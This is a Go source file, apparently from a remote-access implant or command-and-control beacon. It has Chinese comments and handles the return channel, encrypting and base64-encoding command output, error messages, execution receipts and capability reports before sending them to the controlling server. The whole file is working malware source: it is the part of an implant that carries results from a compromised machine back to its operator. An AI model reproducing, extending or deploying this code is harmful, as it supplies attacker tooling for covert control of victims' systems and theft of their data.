package communication

import (
	"bytes"
	"encoding/binary"
	"implant/core/debuglog"
	"implant/core/encrypt"
	"implant/core/utils"
	"sync"
	"sync/atomic"
)

// execCapabilityOnce 保证能力上报每进程只发一次（服务端重启后靠 EXEC_DONE 自愈）。
var execCapabilityOnce sync.Once

// execOutputEnabled 服务端确认支持 EXEC_OUTPUT 后置位；未确认时执行输出仍走
// type=0（旧服务端兼容，避免输出丢失）。
var execOutputEnabled atomic.Bool

// EnableExecOutput 由 EXEC_OUTPUT_ENABLE(99) 命令调用。
func EnableExecOutput() { execOutputEnabled.Store(true) }

// ExecOutput 回送插件/内存执行过程输出：
//   - 服务端确认支持时用 type=98：写 shell 历史但不触发任务完成；
//   - 否则退回 type=0，保持旧服务端可见性（代价是旧服务端仍按输出近似完成任务）。
func ExecOutput(b []byte) {
	if !execOutputEnabled.Load() {
		DataProcess(0, b)
		return
	}
	result, err := utils.CodepageToUTF8(b)
	if err != nil {
		result = b
	}
	criticalSection(98, result)
}

// ExecDone 回送插件/内存执行结束回执（type=96）：[4B taskID][1B ok][utf8 error]。
//
// 不走 DataProcess：type=0 会做码页→UTF-8 转换，错误文本不需要也不应被转换。
func ExecDone(taskID uint32, ok bool, errMsg string) {
	payload := make([]byte, 5, 5+len(errMsg))
	binary.BigEndian.PutUint32(payload[:4], taskID)
	if ok {
		payload[4] = 1
	}
	payload = append(payload, []byte(errMsg)...)
	criticalSection(96, payload)
}

// ReportExecCapabilityOnce 在客户端首次成功收到服务端数据后上报能力（一次）。
func ReportExecCapabilityOnce() {
	execCapabilityOnce.Do(func() {
		ReportExecCapability()
	})
}

// ReportExecCapability 立即上报执行完成能力（type=97）。
// 除首次上报外，收到不带 EXD1 头的执行命令时也会补发一次（服务端重启后
// 能力表会丢失，轮询客户端不会重连，只能靠这里自愈）。
func ReportExecCapability() {
	criticalSection(97, []byte{1})
}

// ErrorProcess 将错误信息作为结果回送（callbackType=31）。
func ErrorProcess(err error) {
	errMsgBytes := []byte(err.Error())
	debuglog.Println(err)
	criticalSection(31, errMsgBytes)
}

// DataProcess 回送命令结果。callbackType==0 时先做码页转 UTF-8。
func DataProcess(callbackType int, b []byte) {
	result := b
	if callbackType == 0 {
		var err error
		result, err = utils.CodepageToUTF8(b)
		if err != nil {
			ErrorProcess(err)
		}
	}
	criticalSection(callbackType, result)
}

// criticalSection 构建加密结果包并经当前 Transport 回送。
// 【优化】原实现用全局锁串行化"加密 + base64 + 网络发送"全部阶段：
// 下载/监控等大流量包（base64 膨胀 + 大块加密）会阻塞所有其他结果，形成队头阻塞。
// 现在 MakePacket + EncodeBase64（CPU 密集）在锁外并发执行；
// 网络发送由各 adapter 自身的发送锁（sendMutex）串行化（发送必须串行防帧交错）。
// 协议特定的分帧（tcp 的 MetaInfo/normalData、http 的 POST body 等）由各 adapter 的
// SendResult 实现，core 不感知。
func criticalSection(callbackType int, b []byte) {
	packet := MakePacket(callbackType, b)
	if len(packet) == 0 {
		// K8: 加密失败（会话密钥过期/不可用）时禁止发送空载荷（原 base64 空串照发 → 服务端静默丢包无提示）
		debuglog.Printf("[COMM] 加密结果包失败，丢弃 (type=%d, %d bytes)\n", callbackType, len(b))
		return
	}
	b64Packet, err := encrypt.EncodeBase64(packet)
	if err != nil || len(b64Packet) == 0 {
		debuglog.Printf("[COMM] 结果包编码失败，丢弃 (type=%d)\n", callbackType)
		return
	}

	transport := GetTransport()
	if transport == nil {
		debuglog.Printf("[COMM] CurrentTransport 未设置，丢弃结果 (type=%d, %d bytes)\n", callbackType, len(b64Packet))
		return
	}
	if err := transport.SendResult(b64Packet); err != nil {
		debuglog.Printf("[COMM] SendResult 失败: %v\n", err)
	}
}

// MakePacket 构造 replyType(4) | result 并加密（优先会话密钥，失败回落旧加密）。
func MakePacket(replyType int, b []byte) []byte {
	buf := new(bytes.Buffer)

	replyTypeBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(replyTypeBytes, uint32(replyType))
	buf.Write(replyTypeBytes)

	buf.Write(b)

	encrypted, err := encrypt.EncryptWithSessionKey(buf.Bytes())
	if err != nil {
		// 【加密体系改造】加密失败直接丢弃该结果包（不再回落旧加密）
		return nil
	}
	return encrypted
}
